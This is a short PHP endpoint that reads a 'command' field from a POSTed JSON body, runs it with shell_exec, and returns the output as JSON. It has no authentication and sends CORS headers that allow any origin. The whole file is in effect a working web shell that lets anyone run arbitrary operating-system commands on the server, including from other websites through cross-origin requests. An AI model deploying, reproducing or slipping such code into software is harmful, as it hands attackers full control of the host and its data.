<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

$incomingData = json_decode(file_get_contents("php://input"));

if (isset($incomingData->command)) {
    echo '{"response": "'.preg_replace("/\n/m", '<br />', preg_replace("#(?<!\\\\)(\\$|\\\\)#", '\\\\$1', htmlspecialchars(shell_exec($incomingData->command)))).'"}';
}